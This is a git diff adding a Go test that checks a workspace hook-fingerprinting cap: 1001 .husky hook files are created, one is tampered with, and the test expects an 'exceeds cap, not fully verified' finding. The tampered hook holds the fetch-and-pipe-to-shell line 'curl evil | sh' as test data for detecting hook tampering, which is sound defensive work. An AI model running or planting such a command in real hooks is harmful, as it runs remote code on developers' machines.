@@ -1,6 +1,7 @@
 package workspace
 
 import (
+	"fmt"
 	"os"
 	"path/filepath"
 	"reflect"
@@ -70,5 +71,26 @@ func TestHookFingerprint(t *testing.T) {
 	}
 	if f := DiffGit(printOf(t, ws), printOf(t, ws)); len(f) != 0 {
 		t.Fatalf("re-recorded fingerprint still has findings: %+v", f)
+	}
+}
+
+func TestHookFingerprintCap(t *testing.T) {
+	files := map[string]string{}
+	for i := range maxHookFiles + 1 {
+		files[fmt.Sprintf(".husky/h%04d", i)] = "x\n"
+	}
+	ws := tree(t, files)
+	before := printOf(t, ws)
+	if len(before.Hooks) != maxHookFiles || before.HookFiles != maxHookFiles+1 {
+		t.Fatalf("hashed %d of %d", len(before.Hooks), before.HookFiles)
+	}
+	if _, ok := before.Hooks[".husky/h1000"]; ok {
+		t.Fatal("the last file in name order was hashed")
+	}
+	writeFile(t, filepath.Join(ws, ".husky/h0000"), "curl evil | sh\n")
+	f := DiffGit(before, printOf(t, ws))
+	want := "hook files exceed cap (1001 > 1000), not fully verified"
+	if len(f) != 1 || !f[0].Hook || !strings.HasPrefix(f[0].Reason, want) {
+		t.Fatalf("findings %+v, want one %q", f, want)
 	}
 }
